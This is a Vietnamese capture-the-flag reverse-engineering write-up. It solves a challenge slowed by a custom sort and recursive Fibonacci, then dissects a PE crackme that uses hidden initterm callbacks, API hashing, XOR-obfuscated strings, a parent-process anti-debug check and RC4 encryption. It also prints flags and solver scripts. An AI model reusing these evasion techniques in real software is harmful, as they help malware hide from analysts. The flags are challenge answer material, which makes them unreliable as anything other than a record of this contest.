* Đầu tiên gọi `quick_sort` và truyền vào địa chỉ phần tử đầu tiên của mảng, 0 và phần từ của mảng `lenght`.
![ảnh](https://hackmd.io/_uploads/rJYrpk2Pyg.png)
![ảnh](https://hackmd.io/_uploads/HyeiaJ3vyx.png)
* Chia mảng thành hai nửa tại điểm giữa và sắp xếp từng nửa.
* So sánh và hoán đổi phần tử giữa nếu cần và đệ quy với phần còn lại.
* Hàm này chia nhỏ mảng thành hai phần dựa trên trung điểm `end = (int)(mid + a2) >> 1;`, thay vì chọn một pivot và thực hiện phân vùng như Quicksort chuẩn nên thời gian chạy rất lâu có thể lờ mờ đoán ra nó đã làm chậm chương trình khi chạy ban đầu.

Lấy giá trị giữa (enc_length[i] >> 1) từ mảng enc_data và thực hiện các phép XOR giữa các byte của phần tử giữa
![ảnh](https://hackmd.io/_uploads/H1nrGlnwJx.png)


Tính số Fibonacci tại vị trí 2*i
![ảnh](https://hackmd.io/_uploads/rkejGgnwyl.png)

`i = 0 --> fibo[0] = 0`

![ảnh](https://hackmd.io/_uploads/BkUySx2wyl.png)

`i = 1 --> fibo[2] = 1`

![ảnh](https://hackmd.io/_uploads/HyumHx3P1l.png)

`i = 2 --> fibo[4] = 3`

```c
__int64 __fastcall fibonacci(int n)
{
  int prev; // [rsp+20h] [rbp-18h]

  if ( !n )
    return 0LL;
  if ( n == 1 )
    return 1LL;
  prev = fibonacci(n - 1);
  return (unsigned int)fibonacci(n - 2) + prev;
}
```

Hàm tính `fibonacci` không tối ưu vì khi i tăng lên, thời gian tính fibonacci tăng theo hàm mũ:
* Hàm được viết dạng đệ quy không tối ưu
* Mỗi lần gọi fibonacci(n) sẽ gọi lại fibonacci(n-1) và fibonacci(n-2) dẫn đến việc tính lại rất nhiều lần các giá trị đã tính trước đó.

Tiếp theo **xor** các byte của số Fibonacci với nhau.

XOR kết quả với ký tự mã hóa để có ký tự gốc.

In ký tự đã giải mã.

Tóm lại vấn đề của chal này là ở hàm `quick_sort` đã bị custom cho chậm đi không theo chuẩn `qucik_sort` thông thường và hàm `fibonacci` viết theo kiểu đệ quy với độ phức tạp O($n^2$) với n = 2*i và i tăng dần từ 0 đến 49 dẫn đến thời gian tính toán sẽ tăng theo hàm mũ, khiến chương trình chạy rất chậm.

Phương pháp sử dụng để tối ưu là viết lại hàm `fibonacci` và thực hiện tính toán trước:

```python
def fibonacci_optimized(n):
    if n <= 1:
        return n
    prev, curr = 0, 1
    for _ in range(2, n + 1):
        prev, curr = curr, prev + curr
    return curr
```
Tối ưu lại `sort` chỉ copy, sắp xếp phần mảng cần thiết thay vì toàn bộ mảng và sử dụng hàm `sort` có sẵn trong python.

Trước đó thì cần lấy `enc_data`, `enc_length`, `enc_char` từ chal:

![ảnh](https://hackmd.io/_uploads/Sk2tPx3DJg.png)

Script lấy data từ IDA:
![ảnh](https://hackmd.io/_uploads/SkfBuxnw1e.png)

```python
import idc
import idaapi

start_addr = 0x1FF422B1860
array_size = 98002

values = []
for i in range(array_size):
    value = idc.get_wide_dword(start_addr + i * 4)
    values.append(value)

with open("enc_data.txt", "w") as file:
    for value in values:
        file.write(f"{value}\n")
```

```python
def fibonacci_optimized(n):
    if n <= 1:
        return n
    prev, curr = 0, 1
    for _ in range(2, n + 1):
        prev, curr = curr, prev + curr
    return curr

def get_enc_data():
    with open('enc_data.txt', 'r') as f:
        return [int(line.strip()) for line in f.readlines()]

def main():
    enc_length = [100, 150, 200, 306, 802, 1090, 12088, 14086, 16084, 18082, 20080, 22078, 24076,
        26074, 28072, 30070, 32068, 34066, 36064, 38062, 40060, 42058, 44056, 46054, 48052,
        50050, 52048, 54046, 56044, 58042, 60040, 62038, 64036, 66034, 68032, 70030, 72028,
        74026, 76024, 78022, 80020, 82018, 84016, 86014, 88012, 90010, 92008, 94006, 96004,
        98002]
    
    enc_chars = [0x7B, 0x1E, 0xFB, 0x79, 0xAA, 0x24, 0xBC, 0xC9, 0x8B, 0x0E, 0x31, 0x49, 0xD3, 0x91,
        0xCE, 0x24, 0x40, 0xA7, 0x9B, 0xFB, 0x6A, 0x0F, 0x9D, 0xC5, 0x15, 0x36, 0x73, 0x6F,
        0x04, 0x0D, 0xC3, 0x24, 0x78, 0xA1, 0xA3, 0xB6, 0x75, 0xDC, 0xF3, 0xB5, 0xF7, 0x7E,
        0xA4, 0xE5, 0x3C, 0x43, 0x22, 0xF9, 0x05, 0xB0]
    
    enc_data = get_enc_data()
    
    fib_values = [fibonacci_optimized(2*i) for i in range(50)]
    print("Fibonacci calculation complete.")
    
    # Hàm decode cho một phần tử
    def decode_single(i):
        # Copy và sắp xếp phần mảng cần thiết
        temp_array = enc_data[:enc_length[i]+1].copy()
        temp_array.sort()
        
        # Lấy phần tử giữa
        mid_element = temp_array[enc_length[i] >> 1]
        
        # Tách và XOR các byte
        byte1 = mid_element & 0xFF
        byte2 = ((mid_element >> 8) & 0xFF) ^ byte1
        byte3 = ((mid_element >> 16) & 0xFF) ^ byte2
        decrypted_char = ((mid_element >> 24) & 0xFF) ^ byte3
        
        # XOR với bytes của fibonacci
        fib_result = fib_values[i]
        fib_xor = ((fib_result >> 24) & 0xFF) ^ \
                  ((fib_result >> 16) & 0xFF) ^ \
                  ((fib_result >> 8) & 0xFF) ^ \
                  (fib_result & 0xFF)
        
        return chr(enc_chars[i] ^ decrypted_char ^ fib_xor)

    # Giải mã từng ký tự và in ra
    result = ""
    for i in range(50):
        current_char = decode_single(i)
        result += current_char
        print(current_char, end='', flush=True)
    
    print("\nComplete!")


main()
```

>  `KCSC{just_a_sort_of_O-OoOptim...ize_references}`

![ảnh](https://hackmd.io/_uploads/S1NRdlhPyx.png)


> **2 chall hard dưới đây sau khi nhận được hint từ các author và [@Zupp](https://hackmd.io/@Zupp) thì e đã hoàn thành. Xin cảm ơn các author và Zupp rất nhiều.**
{: .prompt-danger }


## 9. Cat Laughing at you

![ảnh](https://hackmd.io/_uploads/B1hIIzQ_1e.png)

Một chall PE-32bit. Chạy thử thì chall yêu cầu $input$ nếu sai thì thực hiện mở link [clip youtube](https://www.youtube.com/watch?v=L8XbI9aJOXk).

![ảnh](https://hackmd.io/_uploads/Bk7FPMXOye.png)

Load vào IDA hàm main chả có gì.

> `initterm`
{: .prompt-tip }

Mình nhận được hint từ author vì thế sẽ bắt đầu khai thác từ đó.

![ảnh](https://hackmd.io/_uploads/rkvMOfQOJl.png)

Trace tới phần gọi hàm main có thông tin như sau:
![ảnh](https://hackmd.io/_uploads/r1UtRG7_1x.png)

> `initterm` là một hàm trong thư viện runtime của Microsoft C (CRT) được sử dụng để khởi tạo các đối tượng hoặc hàm toàn cục (global) cụ thể trong chương trình C hoặc C++. Hàm này thường được gọi tự động khi chương trình bắt đầu và trước khi hàm main được gọi. ([*tham khảo*](https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/initterm-initterm-e?view=msvc-170))
{: .prompt-info }

Cụ thể, `initterm` được sử dụng để gọi một danh sách các con trỏ hàm (function pointers) đã được đăng ký để thực hiện các công việc khởi tạo vì thế ta sẽ bắt đầu với `dword_F63104`:
![ảnh](https://hackmd.io/_uploads/BkZGyXX_1x.png)

* Hàm `sub_F621C6`:
![ảnh](https://hackmd.io/_uploads/S1T8yXXOyl.png)
![ảnh](https://hackmd.io/_uploads/HyLSk77dJx.png)


    * Tổng quan thì hàm này thực hiện thiết lập bộ lọc ngoại lệ không được xử lý cho chương trình (`sub_F6281E`) và kiểm tra xử lỹ lỗi toán học tuỳ chỉnh.

* Hàm `sub_F61000`:
![ảnh](https://hackmd.io/_uploads/rkHIWX7_Jl.png)

    * Hàm thực hiện gán kết quả trả vể của hàm `sub_F61060` cho `dword_F64400` liên quan đến hàm `sub_F61010` sẽ phân tích sau.
    * Tiến hành phân tích `sub_F61060`:
  
    ```c
    char __usercall sub_F61060@<al>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
    {
      _BYTE *v3; // eax
      int v4; // ecx
      _BYTE *v5; // eax
      int v6; // ecx
      _BYTE *v7; // eax
      int v8; // ecx
      struct _LIST_ENTRY *v9; // eax
      int (__cdecl *v10)(int, int, int, int); // esi
      int v11; // ebx
      int (__stdcall *v12)(int, _DWORD *); // edi
      int v13; // esi
      int v14; // edi
      int v15; // esi
      char v16; // bl
      char v17; // bh
      unsigned int v18; // ecx
      unsigned int v19; // ecx
      int v20; // eax
      unsigned int v21; // ecx
      unsigned int v22; // ecx
      int v23; // eax
      unsigned int v24; // eax
      unsigned int v25; // eax
      int v26; // eax
      int v29; // [esp+0h] [ebp-49Ch]
      void (__cdecl *v30)(int); // [esp+0h] [ebp-49Ch]
      int v31; // [esp+4h] [ebp-498h]
      int (__stdcall *v32)(int, _DWORD *); // [esp+4h] [ebp-498h]
      int v33; // [esp+8h] [ebp-494h]
      int (__stdcall *v34)(int, _DWORD *); // [esp+8h] [ebp-494h]
      int v35; // [esp+Ch] [ebp-490h]
      int (__stdcall *v36)(int, _DWORD); // [esp+Ch] [ebp-490h]
      void (__stdcall *v37)(int); // [esp+10h] [ebp-48Ch]
      int (__stdcall *v38)(int, _DWORD *); // [esp+14h] [ebp-488h]
      char v39; // [esp+1Bh] [ebp-481h]
      _DWORD v40[139]; // [esp+1Ch] [ebp-480h] BYREF
      _DWORD v41[139]; // [esp+248h] [ebp-254h] BYREF
      _DWORD v42[3]; // [esp+474h] [ebp-28h] BYREF
      char v43; // [esp+480h] [ebp-1Ch]
      _DWORD v44[3]; // [esp+484h] [ebp-18h] BYREF
      _DWORD v45[2]; // [esp+490h] [ebp-Ch] BYREF

      v44[0] = 0xF7FBEACE;
      v3 = v44;
      v44[1] = 0xADE6F1F6;
      v4 = 12;
      v44[2] = 0x83E6FBE6;
      do
      {
        *v3++ ^= 0x83u;    // Mixture.exe
        --v4;
      }
      while ( v4 );
      v45[0] = 0xADE7EEE0;
      v5 = v45;
      v45[1] = 0x83E6FBE6;
      v6 = 8;
      do
      {
        *v5++ ^= 0x83u;    // cmd.exe
        --v6;
      }
      while ( v6 );
      v42[0] = 0xEFF3FBE6;
      v7 = v42;
      v42[1] = 0xF1E6F1EC;
      v8 = 13;
      v42[2] = 0xE6FBE6AD;
      v43 = -125;
      do
      {
        *v7++ ^= 0x83u;    // explorer.exe
        --v8;
      }
      while ( v8 );
      kernel32_GetCurrentProcessId = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))API_Hash((void *)0xFCCA572B);
      kernel32_CreateToolhelp32Snapshot = (int)API_Hash((void *)0xF3FFD4A7);
      kernel32_Process32FirstW = (int)API_Hash((void *)0xF9BD7A1C);
      kernel32_Process32NextW = (int)API_Hash((void *)0xFDAA1062);
      kernel32_CloseHandle = (int)API_Hash((void *)0xFC95A7B0);
      kernel32_SetUnhandledExceptionFilter = (int)API_Hash((void *)0xF6CACF0B);
      kernel32_LoadLibraryA = (int)API_Hash((void *)0xF1C2F5AC);
      v9 = API_Hash((void *)0xF9D023F7);
      v10 = (int (__cdecl *)(int, int, int, int))kernel32_GetCurrentProcessId;
      kernel32_GetProcAddress = (int)v9;
      v35 = kernel32_CreateToolhelp32Snapshot;
      v33 = kernel32_Process32FirstW;
      v31 = kernel32_Process32NextW;
      v29 = kernel32_CloseHandle;
      v39 = 0;
      kernel32_GetCurrentProcessId(a2, a3, a1);
      v11 = v10(v29, v31, v33, v35);
      sub_F617C0();
      v12 = (int (__stdcall *)(int, _DWORD *))kernel32_Process32FirstW;
      v38 = (int (__stdcall *)(int, _DWORD *))kernel32_Process32NextW;
      v37 = (void (__stdcall *)(int))kernel32_CloseHandle;
      memset(&v40[1], 0, 0x228u);
      v40[0] = 556;
      v13 = ((int (__stdcall *)(int, _DWORD))kernel32_CreateToolhelp32Snapshot)(2, 0);
      if ( v12(v13, v40) )
      {
        while ( v40[2] != v11 )
        {
          if ( !v38(v13, v40) )
            goto LABEL_10;
        }
        v14 = v40[6];
      }
      else
      {
    LABEL_10:
        v14 = -1;
      }
      v37(v13);
      memset(&v41[1], 0, 0x228u);
      v41[0] = 556;
      v15 = v36(2, 0);
      if ( v34(v15, v41) )
      {
        v16 = v44[0];
        v17 = v45[0];
        while ( 1 )
        {
          if ( v41[2] == v14 )
          {
            v18 = 0;
            if ( v16 )
            {
              do
              {
                word_F64418[v18] = *((char *)v44 + v18);
                ++v18;
              }
              while ( *((_BYTE *)v44 + v18) );
            }
            v19 = v18;
            if ( v19 >= 256 )
    LABEL_37:
              sub_F62036();
            word_F64418[v19] = 0;
            v20 = wcscmp((const unsigned __int16 *)&v41[9], word_F64418);
            if ( v20 )
              v20 = v20 < 0 ? -1 : 1;
            if ( v20 )
            {
              v21 = 0;
              if ( v17 )
              {
                do
                {
                  word_F64418[v21] = *((char *)v45 + v21);
                  ++v21;
                }
                while ( *((_BYTE *)v45 + v21) );
              }
              v22 = v21;
              if ( v22 >= 256 )
                goto LABEL_37;
              word_F64418[v22] = 0;
              v23 = wcscmp((const unsigned __int16 *)&v41[9], word_F64418);
              if ( v23 )
                v23 = v23 < 0 ? -1 : 1;
              if ( v23 )
              {
                v24 = 0;
                if ( LOBYTE(v42[0]) )
                {
                  do
                  {
                    word_F64418[v24] = *((char *)v42 + v24);
                    ++v24;
                  }
                  while ( *((_BYTE *)v42 + v24) );
                }
                v25 = v24;
                if ( v25 >= 256 )
                  goto LABEL_37;
                word_F64418[v25] = 0;
                v26 = wcscmp((const unsigned __int16 *)&v41[9], word_F64418);
                if ( v26 )
                  v26 = v26 < 0 ? -1 : 1;
                if ( v26 )
                  break;
              }
            }
          }
          if ( !v32(v15, v41) )
            goto LABEL_35;
        }
        v39 = 1;
      }
    LABEL_35:
      v30(v15);
      return v39;
    }
    ```

    * Sau khi debug và đổi tên các biến và hàm thì có được nội dung hàm như trên.
    * Khái quát qua thì `sub_F61060` thực hiện lưu ID của tiến trình hiện tại (`CurrentProcessId`); tạo một snapshot của tất cả tiến trình hiện tại `CreateToolhelp32Snapshot`; sử dụng `Process32FirstW` và `Process32NextW` để duyệt qua từng tiến trình sau đó so sánh tên tiến trình với `Mixture.exe`, `cmd.exe`, `explorer.exe` bằng `wcscmp`.

    ![ảnh](https://hackmd.io/_uploads/HJ0hKXXO1x.png)

    * Hiện tại đang debug = ida nên tiến trình hiện tại tên là `ida.exe`.
    * Mục đích của hàm là lấy địa chỉ của những winAPI kiểm tra xem tiến trình cha đang chạy có phải là một trong những tiến trình như `cmd.exe`, `Mixture.exe` hay `explorer.exe` hay không?

    ![ảnh](https://hackmd.io/_uploads/ry0bN7XuJx.png)

    * Nếu đang chạy những tiến trình đó thì trả về `0`, ngược lại trả về `1` sau đó gán cho `dword_F64400` để sử dụng cho hàm `sub_F61010` kế tiếp.

* Hàm `sub_F61010`:
  ```c
    int sub_F61010()
    {
      int result; // eax

      if ( dword_F64400 )
      {
        dword_F64404 = (int)"S0NTQ3tuVUUwcFVaNllsOTNxM3Bocko5MXFVSXZNRjV3bzIwaXEyUzBMMnQvcXcwNUR6amtwVXVVWkg1c0REPT19";
      }
      else
      {
        result = sub_F61440();
        dword_F64404 = (int)"YXV0aG9ybm9vYm1hbm5uZnJvbWtjc2M=";
      }
      return result;
    }
  ```
  
    * Như đã phân tích ở trên muốn có luồng đúng phải chạy = 1 trong 3 tiến đã đề cập để `dword_F64400` được gán = 0 vì thế ở hàm này cần nhảy vào luồng `else` mới chính xác và gán chuỗi $base64$ cho biến `dword_F64404`.

    * Hàm `sub_F61440` --> `sub_391440` (sau khi debug tên hàm bị thay đổi ở 2 ký tự đầu nhưng ko ảnh hưởng gì nên chú ý vào 4 ký tự cuối là được)
  
    ```c
    int sub_391440()
    {
      int (__stdcall *v0)(_DWORD *); // edx
      _BYTE *v1; // eax
      int (__stdcall *v2)(int, _DWORD *); // edi
      int v3; // ecx
      int v4; // esi
      _BYTE *v5; // eax
      int v6; // ecx
      int v7; // ecx
      _BYTE *v8; // eax
      int v9; // ecx
      _BYTE *v10; // eax
      int v11; // ecx
      _BYTE *v12; // eax
      int v13; // ecx
      _BYTE *v14; // eax
      int v15; // ecx
      _BYTE *v16; // eax
      int v17; // ecx
      _BYTE *v18; // eax
      int v19; // ecx
      _BYTE *v20; // eax
      int result; // eax
      _DWORD v22[5]; // [esp+8h] [ebp-A4h] BYREF
      char v23; // [esp+1Ch] [ebp-90h]
      _DWORD v24[5]; // [esp+20h] [ebp-8Ch] BYREF
      _DWORD v25[4]; // [esp+34h] [ebp-78h] BYREF
      char v26; // [esp+44h] [ebp-68h]
      _DWORD v27[4]; // [esp+48h] [ebp-64h] BYREF
      _DWORD v28[4]; // [esp+58h] [ebp-54h] BYREF
      _DWORD v29[3]; // [esp+68h] [ebp-44h] BYREF
      __int16 v30; // [esp+74h] [ebp-38h]
      char v31; // [esp+76h] [ebp-36h]
      _DWORD v32[3]; // [esp+78h] [ebp-34h] BYREF
      __int16 v33; // [esp+84h] [ebp-28h]
      _DWORD v34[3]; // [esp+88h] [ebp-24h] BYREF
      char v35; // [esp+94h] [ebp-18h]
      _DWORD v36[3]; // [esp+98h] [ebp-14h] BYREF
      char v37; // [esp+A4h] [ebp-8h]

      v0 = (int (__stdcall *)(_DWORD *))kernel32_LoadLibraryA;
      v1 = v36;
      v2 = (int (__stdcall *)(int, _DWORD *))kernel32_GetProcAddress;
      v3 = 13;
      v36[0] = 369169206;
      v36[1] = 1162092039;
      v36[2] = 454759257;
      v37 = 119;
      do
      {
        *v1++ ^= 0x77u;
        --v3;
      }
      while ( v3 );
      v4 = v0(v36);
      v22[0] = 118359348;
      v22[1] = 101987843;
      v5 = v22;
      v22[2] = 302325250;
      v6 = 21;
      v22[3] = 51976244;
      v22[4] = 906170130;
      v23 = 119;
      do
      {
        *v5++ ^= 0x77u;
        --v6;
      }
      while ( v6 );
      advapi32_CryptAcquireContextA = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))v2(v4, v22);
      v7 = 16;
      v28[0] = 118359348;
      v8 = v28;
      v28[1] = 302330883;
      v28[2] = 1058145046;
      v28[3] = 1998521366;
      do
      {
        *v8++ ^= 0x77u;
        --v7;
      }
      while ( v7 );
      advapi32_CryptCreateHash = v2(v4, v28);
      v9 = 14;
      v32[0] = 118359348;
      v10 = v32;
      v32[1] = 68566787;
      v32[2] = 51786527;
      v33 = 30486;
      do
      {
        *v10++ ^= 0x77u;
        --v9;
      }
      while ( v9 );
      advapi32_CryptHashData = v2(v4, v32);
      v11 = 15;
      v29[0] = 118359348;
      v12 = v29;
      v29[1] = 85078787;
      v29[2] = 1007812894;
      v30 = 3602;
      v31 = 119;
      do
      {
        *v12++ ^= 0x77u;
        --v11;
      }
      while ( v11 );
      advapi32_CryptDeriveKey = v2(v4, v29);
      v13 = 17;
      v25[0] = 118359348;
      v14 = v25;
      v25[1] = 68301571;
      v25[2] = 236455171;
      v25[3] = 520361535;
      v26 = 119;
      do
      {
        *v14++ ^= 0x77u;
        --v13;
      }
      while ( v13 );
      advapi32_CryptDestroyHash = v2(v4, v25);
      v15 = 13;
      v34[0] = 118359348;
      v16 = v34;
      v34[1] = 337195523;
      v34[2] = 50793989;
      v35 = 119;
      do
      {
        *v16++ ^= 0x77u;
        --v15;
      }
      while ( v15 );
      advapi32_CryptEncrypt = v2(v4, v34);
      v17 = 16;
      v27[0] = 118359348;
      v18 = v27;
      v27[1] = 68301571;
      v27[2] = 236455171;
      v27[3] = 1997410876;
      do
      {
        *v18++ ^= 0x77u;
        --v17;
      }
      while ( v17 );
      advapi32_CryptDestroyKey = v2(v4, v27);
      v19 = 20;
      v24[0] = 118359348;
      v20 = v24;
      v24[1] = 454173955;
      v24[2] = 302257682;
      v24[3] = 51976244;
      v24[4] = 1996689170;
      do
      {
        *v20++ ^= 0x77u;
        --v19;
      }
      while ( v19 );
      result = v2(v4, v24);
      advapi32_CryptReleaseContext = result;
      return result;
    }
    ```
    
    * Khái quát qua thì hàm này lấy địa chỉ của những winAPI trong thư viện `Advapi32.dll` nhằm mục đích phục vụ mã hóa như `CryptAcquireContextA`, `CryptCreateHash`,`CryptHashData`, `Cryptencrypt`,...
    
* Hàm `sub_F61040`:
```c
int sub_F61040()
{
  int result; // eax

  if ( (char *)dword_F64404 == "YXV0aG9ybm9vYm1hbm5uZnJvbWtjc2M=" )
    return kernel32_SetUnhandledExceptionFilter(main_main);
  return result;
}
```

Hàm check giá trị của `dword_F64404` với chuỗi mã hoá $base64$ nếu khớp sẽ thiết lập `kernel32_SetUnhandledExceptionFilter` với tham số là địa chỉ hàm `main_main`- chính là hàm thực thi thật sự của chall.

> `SetUnhandledExceptionFilter` là 1 hàm trong Windows API cho phép bạn xác định một hàm **callback** sẽ được gọi khi ứng dụng gặp lỗi không xử lý được (unhandled exception). Khi một lỗi không xử lý xảy ra, Windows sẽ gọi hàm **callback** mà bạn đã đăng ký với `SetUnhandledExceptionFilter` để thực hiện.
{: .prompt-info }

Tổng quát lại những hàm được gọi trong `initterm` như sau:
* `sub_F621C6`: Thiết lập ngoại lệ về xử lý các lỗi toán học.
* `sub_F61000`: Lấy địa chỉ các Windows API cần thiết và kiểm tra tiến trình hiện tại có phải `cmd.exe`, `mixture.exe`, `explorer.exe` hay không?
* `sub_F61010`: tiến trình cha thỏa điều kiện trên sẽ thực hiện lấy địa chỉ của những hàm Window API cần thiết để phục vụ mã hóa và gán vào biến `dword_F64404` một chuỗi $base64$.
* `sub_F61040`: Kiểm tra biến `dword_F64404` với chuỗi $base64$ cho trước, nếu đúng thì sẽ thực hiện đăng kí xử lý ngoại lệ với hàm `main_main`.

Hàm `main_main`:
```c
int __stdcall main_main(_DWORD **a1)
{
  char *v1; // eax
  int v2; // ecx
  char *v3; // eax
  int v4; // ecx
  CHAR *v5; // eax
  int v6; // ecx
  __int16 *v7; // eax
  int v8; // ecx
  CHAR *v9; // eax
  int v10; // ecx
  __int16 v12; // [esp+0h] [ebp-90h] BYREF
  char v13[2]; // [esp+4h] [ebp-8Ch] BYREF
  char v14; // [esp+6h] [ebp-8Ah]
  char Source[52]; // [esp+8h] [ebp-88h] BYREF
  char Destination[52]; // [esp+3Ch] [ebp-54h] BYREF
  char Format[4]; // [esp+70h] [ebp-20h] BYREF
  unsigned int v18; // [esp+74h] [ebp-1Ch]
  unsigned int v19; // [esp+78h] [ebp-18h]
  unsigned int v20; // [esp+7Ch] [ebp-14h]
  __int16 v21; // [esp+80h] [ebp-10h]
  CHAR Caption[4]; // [esp+84h] [ebp-Ch] BYREF
  int v23; // [esp+88h] [ebp-8h]

  if ( **a1 == 0xC0000096 )
  {
    *(_DWORD *)Format = 0xCEDFC5EE;
    v1 = Format;
    v18 = 0xC4F88BD9;
    v2 = 18;
    v19 = 0xC3DFCEC6;
    v20 = 0x91CCC5C2;
    v21 = 0xAB8B;
    do
    {
      *v1++ ^= 0xABu;
      --v2;
    }
    while ( v2 );
    print(Format, v12);
    *(_WORD *)v13 = 0xBEE8;
    v14 = -51;
    v3 = v13;
    v4 = 3;
    do
    {
      *v3++ ^= 0xCDu;
      --v4;
    }
    while ( v4 );
    scan(v13, (char)Source);
    if ( encrypt(Source) )
    {
      *(_DWORD *)Caption = 0xACBCACA4;
      v5 = Caption;
      LOBYTE(v23) = -108;
      v6 = 5;
      do
      {
        *v5++ ^= 0xEFu;
        --v6;
      }
      while ( v6 );
      memset(Destination, 0, 0x32u);
      *(_DWORD *)Destination = *(_DWORD *)Caption;
      Destination[4] = v23;
      strcat_s(Destination, 0x32u, Source);
      v12 = -23051;
      v7 = &v12;
      v8 = 2;
      do
      {
        *(_BYTE *)v7 ^= 0x88u;
        v7 = (__int16 *)((char *)v7 + 1);
        --v8;
      }
      while ( v8 );
      *(_DWORD *)Caption = -1111771460;
      v23 = -86254629;
      Destination[HIBYTE(v12)] = v12;
      v9 = Caption;
      v10 = 8;
      do
      {
        *v9++ ^= 0xFAu;
        --v10;
      }
      while ( v10 );
      MessageBoxA(0, Destination, Caption, 0x40u);
    }
    else
    {
      sub_391BB0();
    }
  }
  return 1;
}
```

Đem giá trị của `format` đi $xor$ trong vòng lặp `while` thì nhận được chuỗi `Enter Something:` chính là yêu cầu nhập $input$ của chall khi chạy ban đầu.

Tương tự đem các giá trị còn lại tính toán trong vòng lặp `while` nhận được định dạng `%s` của $input$, `KCSC{}`, thông báo `FLAG!!!`.

Phân tích hàm `encrypt`:
```c
char __thiscall encrypt(const char *this)
{
  int (__stdcall *CryptCreateHash)(int, int, _DWORD, _DWORD, int *); // edi
  void (__stdcall *CryptDestroyHash)(int); // esi
  void (__stdcall *CryptReleaseContext)(int, _DWORD); // ebx
  _BYTE *v4; // eax
  int v5; // ecx
  int v6; // eax
  size_t v7; // esi
  void *v8; // edi
  int v9; // ecx
  int v10; // edi
  int v12; // [esp-4h] [ebp-64h]
  int (__stdcall *CryptEncrypt)(int, _DWORD, int, _DWORD, void *, size_t *, size_t); // [esp+Ch] [ebp-54h]
  int (__stdcall *CryptDeriveKey)(int, int, int, _DWORD, int *); // [esp+14h] [ebp-4Ch]
  int (__stdcall *CryptHashData)(int, _DWORD *, int, _DWORD); // [esp+18h] [ebp-48h]
  void (__stdcall *CryptDestroyKey)(int); // [esp+1Ch] [ebp-44h]
  size_t Size; // [esp+20h] [ebp-40h] BYREF
  int phKey; // [esp+24h] [ebp-3Ch] BYREF
  int phHash; // [esp+28h] [ebp-38h] BYREF
  int phProv; // [esp+2Ch] [ebp-34h] BYREF
  _DWORD v22[10]; // [esp+30h] [ebp-30h] BYREF
  __int16 v23; // [esp+58h] [ebp-8h]
  char v24; // [esp+5Ah] [ebp-6h]

  Size = strlen(this);
  if ( Size != 40 )
    return 0;
  CryptCreateHash = (int (__stdcall *)(int, int, _DWORD, _DWORD, int *))advapi32_CryptCreateHash;
  CryptDestroyHash = (void (__stdcall *)(int))advapi32_CryptDestroyHash;
  CryptReleaseContext = (void (__stdcall *)(int, _DWORD))advapi32_CryptReleaseContext;
  CryptHashData = (int (__stdcall *)(int, _DWORD *, int, _DWORD))advapi32_CryptHashData;
  CryptDeriveKey = (int (__stdcall *)(int, int, int, _DWORD, int *))advapi32_CryptDeriveKey;
  CryptEncrypt = (int (__stdcall *)(int, _DWORD, int, _DWORD, void *, size_t *, size_t))advapi32_CryptEncrypt;
  CryptDestroyKey = (void (__stdcall *)(int))advapi32_CryptDestroyKey;
  if ( !advapi32_CryptAcquireContextA(&phProv, 0, 0, 1, 0) )
    return 0;
  if ( CryptCreateHash(phProv, 0x8004, 0, 0, &phHash) )// SHA1
  {
    v22[0] = 0xDEDADAC6;
    v4 = v22;
    v22[1] = 0x818194DD;
    v5 = 43;
    v22[2] = 0x80D9D9D9;
    v22[3] = 0xDADBC1D7;
    v22[4] = 0x80CBCCDB;
    v22[5] = 0x81C3C1CD;
    v22[6] = 0xCDDACFD9;
    v22[7] = 0x93D891C6;
    v22[8] = 0x9AD9FFCA;
    v22[9] = 0xC9F997D9;
    v23 = 0xCDF6;
    v24 = 0xFF;
    do
    {
      *v4++ ^= 0xAEu;
      --v5;
    }
    while ( v5 );
    if ( CryptHashData(phHash, v22, 0x2B, 0) )
    {
      v6 = CryptDeriveKey(phProv, 0x6801, phHash, 0, &phKey);// RC4
      v12 = phHash;
      if ( v6 )
      {
        CryptDestroyHash(phHash);
        v7 = Size + 1;
        v8 = malloc(Size + 1);
        memcpy(v8, this, Size);
        *((_BYTE *)v8 + Size) = 0;
        if ( CryptEncrypt(phKey, 0, 1, 0, v8, &Size, v7) )
        {
          v9 = 0;
          v10 = (_BYTE *)v8 - enc_flag;
          while ( enc_flag[v10 + v9] == enc_flag[v9] )
          {
            if ( ++v9 >= 40 )
            {
              CryptDestroyKey(phKey);
              CryptReleaseContext(phProv, 0);
              return 1;
            }
          }
        }
        CryptDestroyKey(phKey);
        goto LABEL_16;
      }
    }
    else
    {
      v12 = phHash;
    }
    CryptDestroyHash(v12);
  }
LABEL_16:
  CryptReleaseContext(phProv, 0);
  return 0;
}
```

Sơ lược qua thì hàm này đầu tiên kiểm tra độ dài $input$ là 40 ký tự, gán địa chỉ của các hàm Window API từ `advapi32.dll` _ đây là các hàm quan trọng để thực hiện hash, mã hóa.

Hàm mã hoá theo luồng như sau:

* Tạo hash SHA-1 (0x8004):
    ```c
    if (CryptCreateHash(phProv, 0x8004, 0, 0, &phHash))
    ```
* Chuẩn bị data để hash (1 link youtube):
    ```python
    init_data = [
            0xDEDADAC6, 0x818194DD, 0x80D9D9D9, 0xDADBC1D7, 0x80CBCCDB, 0x81C3C1CD, 
            0xCDDACFD9, 0x93D891C6, 0x9AD9FFCA, 0xC9F997D9, 0xCDF6, 0xFF
        ]
    data = []
    for dword in init_data[:-2]:
        data.extend(dword.to_bytes(4, byteorder='little'))

    # Thêm hai phần tử cuối cùng vào danh sách byte
    data.extend(init_data[-2].to_bytes(2, byteorder='little'))  # 2 byte cuối của 0xCDF6
    data.append(init_data[-1])  # 1 byte cuối cùng: 0xFF

    # Xor từng byte với 0xAE
    data = [chr(byte ^ 0xAE) for byte in data]
    data = ''.join(data)
    print(data)
    ```
    ![ảnh](https://hackmd.io/_uploads/rkvW98mdyg.png)

* Hash data:
    ```c
    if (CryptHashData(phHash, data, 0x2B, 0))
    ```

* Gen key RC4 (0x6801):
    ```c
    if (CryptDeriveKey(phProv, 0x6801, phHash, 0, &phKey))
    ```

* Mã hoá $input$:
    ```c
    v8 = malloc(Size + 1);
    memcpy(v8, this, Size);
    *((_BYTE *)v8 + Size) = 0;
    if (CryptEncrypt(phKey, 0, 1, 0, v8, &Size, v7))
    ```

* So sánh với `enc_flag`:
    ```c
    v9 = 0;
    v10 = (_BYTE *)v8 - enc_flag;
    while (enc_flag[v10 + v9] == enc_flag[v9]) {
        if (++v9 >= 40)
            return 1;
    }
    ```

